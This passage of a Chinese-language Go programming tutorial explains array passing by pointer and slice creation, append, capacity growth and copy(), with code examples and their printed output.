v2)<br>&#125;<br>fmt.Println()<br>&#125;<br>&#125;<br>&gt;&gt;<br>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)=<span class="hljs-number">1</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">2</span> (<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">3</span> <br>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)=<span class="hljs-number">4</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">5</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">6</span> <br></code></pre></td></tr></table></figure><h2 id="数组拷贝和传参"><a href="#数组拷贝和传参" class="headerlink" title="数组拷贝和传参"></a>数组拷贝和传参</h2><p>值拷贝会造成性能问题，通常使用 slice 或数组指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printArr</span><span class="hljs-params">(arr *[5]<span class="hljs-type">int</span>)</span></span> &#123;<br>arr[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> arr &#123;<br>fmt.Println(k, v)<br>&#125;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> arr1 [<span class="hljs-number">5</span>]<span class="hljs-type">int</span><br>printArr(&amp;arr1)<br>fmt.Println(arr1)<br>arr2 := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>&#125;<br>printArr(&amp;arr2)<br>fmt.Println(arr2)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0</span> <span class="hljs-number">10</span><br><span class="hljs-number">1</span> <span class="hljs-number">0</span><br><span class="hljs-number">2</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> <span class="hljs-number">0</span><br><span class="hljs-number">4</span> <span class="hljs-number">0</span><br>[<span class="hljs-number">10</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><span class="hljs-number">0</span> <span class="hljs-number">10</span><br><span class="hljs-number">1</span> <span class="hljs-number">4</span><br><span class="hljs-number">2</span> <span class="hljs-number">6</span><br><span class="hljs-number">3</span> <span class="hljs-number">8</span><br><span class="hljs-number">4</span> <span class="hljs-number">10</span><br>[<span class="hljs-number">10</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">8</span> <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><p>为什么 arr2 数组输出的第一个值不是 2 呢，因为在进入 <code>printArr</code> 函数时，<code>arr[0]=10</code>，所以会被赋值为 10，输出的就是 10</p><h1 id="切片-Slice"><a href="#切片-Slice" class="headerlink" title="切片 Slice"></a>切片 Slice</h1><p>Slice 既不是数组也不是数组指针，是数组的一个引用，是引用类型。自身是结构体，值拷贝传递。长度可变，一般格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> 变量名 []类型<br><span class="hljs-keyword">var</span> str []<span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><h2 id="创建切片"><a href="#创建切片" class="headerlink" title="创建切片"></a>创建切片</h2><p>在 fun main 中</p><p>声明切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s1 []<span class="hljs-type">int</span><br><span class="hljs-keyword">if</span> s1 == <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;null&quot;</span>)<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;不是 null&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>:&#x3D; 创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := []<span class="hljs-type">int</span>&#123;&#125;<br>fmt.Println(s2)<br></code></pre></td></tr></table></figure><p>make() 创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s3 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>)<br>fmt.Println(s3)<br></code></pre></td></tr></table></figure><p>初始化赋值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s4 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>fmt.Println(s4)<br></code></pre></td></tr></table></figure><p>从数组切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">s5 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Println(s5)<br>arr := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><span class="hljs-keyword">var</span> s6 []<span class="hljs-type">int</span><br>s6 = arr[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]<br>fmt.Println(s6)<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><h2 id="切片初始化"><a href="#切片初始化" class="headerlink" title="切片初始化"></a>切片初始化</h2><p>len() 长度，cap() 容量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-keyword">var</span> slice0 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]<br><span class="hljs-keyword">var</span> slice1 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br><span class="hljs-keyword">var</span> slice2 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">5</span>:<span class="hljs-number">10</span>]<br><span class="hljs-keyword">var</span> slice3 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(arr)]<br><span class="hljs-keyword">var</span> slice4 = arr[:<span class="hljs-built_in">len</span>(arr)<span class="hljs-number">-1</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(arr, slice0, slice1, slice2, slice3, slice4)<br>arr2 := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>slice5 := arr[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]<br>slice6 := arr[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br>slice7 := arr[<span class="hljs-number">5</span>:<span class="hljs-number">10</span>]<br>slice8 := arr[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(arr)]<br>slice9 := arr[:<span class="hljs-built_in">len</span>(arr)<span class="hljs-number">-1</span>]<br>fmt.Println(arr2, slice5, slice6, slice7, slice8, slice9)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span>]<br>[<span class="hljs-number">9</span> <span class="hljs-number">8</span> <span class="hljs-number">7</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span>] [<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><h2 id="make-创建切片"><a href="#make-创建切片" class="headerlink" title="make() 创建切片"></a>make() 创建切片</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> slice []<span class="hljs-keyword">type</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>)<br>slice  := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>)<br>slice  := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>, <span class="hljs-built_in">cap</span>)(类型，长度，容量)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> slice1 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>slice2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>slice3 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>)<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>创建 slice 数组，自动分配底层数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>: <span class="hljs-number">100</span>&#125;<span class="hljs-comment">//使用索引初始化</span><br>fmt.Println(s1, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))<br><br>s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>)<br>fmt.Println(s2, <span class="hljs-built_in">len</span>(s2), <span class="hljs-built_in">cap</span>(s2))<br><br>s3 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>)<br>fmt.Println(s3, <span class="hljs-built_in">len</span>(s3), <span class="hljs-built_in">cap</span>(s3))<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100</span>] <span class="hljs-number">9</span> <span class="hljs-number">9</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] <span class="hljs-number">6</span> <span class="hljs-number">8</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] <span class="hljs-number">6</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>用 make 动态创建 slice ，可以让数组不需要用常量做长度</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>p := &amp;s[<span class="hljs-number">2</span>]<br>*p += <span class="hljs-number">100</span><br>fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">102</span> <span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>[][]T 表明元素类型为 []T，比如 [][]int 表明元素类型为 []int</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [][]<span class="hljs-type">int</span>&#123;<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;,<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">100</span>, <span class="hljs-number">200</span>&#125;,<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>&#125;,<br>&#125;<br>fmt.Println(data)<br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">100</span> <span class="hljs-number">200</span>] [<span class="hljs-number">11</span> <span class="hljs-number">22</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span>]]<br></code></pre></td></tr></table></figure><p>还可以直接修改 struct array&#x2F;slice 成员</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>d := [<span class="hljs-number">5</span>]<span class="hljs-keyword">struct</span> &#123;<span class="hljs-comment">//创建一个数组，元素为结构体</span><br>x <span class="hljs-type">int</span><br>&#125;&#123;&#125;<br>s := d[:]<br>d[<span class="hljs-number">1</span>].x = <span class="hljs-number">10</span><span class="hljs-comment">//修改 d 中的第二个元素为 10</span><br>s[<span class="hljs-number">2</span>].x = <span class="hljs-number">20</span><span class="hljs-comment">//修改 s 中第三个元素为 20</span><br>fmt.Println(d)<br>fmt.Printf(<span class="hljs-string">&quot;%p,%p\n&quot;</span>, &amp;d, &amp;d[<span class="hljs-number">0</span>])<br>&#125;<br>&gt;&gt;<br>[&#123;<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-number">10</span>&#125; &#123;<span class="hljs-number">20</span>&#125; &#123;<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-number">0</span>&#125;]<br><span class="hljs-number">0xc000010390</span>,<span class="hljs-number">0xc000010390</span><br></code></pre></td></tr></table></figure><p>数组  <code>d</code>  和切片  <code>s</code>  共享同一块底层数据，因此通过数组或切片修改数据会相互影响</p><h2 id="append"><a href="#append" class="headerlink" title="append()"></a>append()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Println(a)<br><span class="hljs-keyword">var</span> b = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;<br>fmt.Println(b)<br>c := <span class="hljs-built_in">append</span>(a, b...)<br>fmt.Println(c)<br>d := <span class="hljs-built_in">append</span>(c, <span class="hljs-number">7</span>)<br>fmt.Println(d)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>]<br></code></pre></td></tr></table></figure><p>append 向 slice 尾部添加数据，返回新的对象</p><p>超出原 slice.cap 的限制时，会重新分配底层数组，即使是原数组没有填满</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>: <span class="hljs-number">0</span>&#125; <span class="hljs-comment">//自动推导数组长度，数组扩展到长度 11</span><br>s := data[:<span class="hljs-number">2</span>:<span class="hljs-number">3</span>]                        <span class="hljs-comment">//从 0 索引到 2 索引，容量为 3</span><br><br>s = <span class="hljs-built_in">append</span>(s, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>)<br><br>fmt.Println(s, data)<br>fmt.Println(&amp;s[<span class="hljs-number">0</span>], &amp;data[<span class="hljs-number">0</span>])<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">100</span> <span class="hljs-number">200</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><span class="hljs-number">0xc000010390</span> <span class="hljs-number">0xc0000141e0</span><br></code></pre></td></tr></table></figure><p>append 后的 s 重新分配了底层数组</p><p>slice 中 cap 重新分配</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>c := <span class="hljs-built_in">cap</span>(s)<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++ &#123;<br>s = <span class="hljs-built_in">append</span>(s, i)<br><span class="hljs-keyword">if</span> n := <span class="hljs-built_in">cap</span>(s); n &gt; c &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d-&gt;%d\n&quot;</span>, c, n)<br>c = n<br>&#125;<br><br>&#125;<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span><br><span class="hljs-number">2</span>-&gt;<span class="hljs-number">4</span><br><span class="hljs-number">4</span>-&gt;<span class="hljs-number">8</span><br><span class="hljs-number">8</span>-&gt;<span class="hljs-number">16</span><br><span class="hljs-number">16</span>-&gt;<span class="hljs-number">32</span><br><span class="hljs-number">32</span>-&gt;<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>通常以 <strong>2</strong> 倍容量来分配底层数组</p><h2 id="切片拷贝"><a href="#切片拷贝" class="headerlink" title="切片拷贝"></a>切片拷贝</h2><p>copy() 函数复制数据，以长度小的为准，长度小的复制到大的去，指向同一底层数组，允许元素区间重叠</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br><br>s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br><span class="hljs-built_in">copy</span>(s2, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br>s3 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s3)<br><br>s3 = <span class="hljs-built_in">append</span>(s3, s2...)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s3)<br><br>s3 = <span class="hljs-built_in">append</span>(s3, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)<br>fmt.Printf(<span class="hljs-string">&quot;%v&quot;</span>, s3)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>]<br>[<span 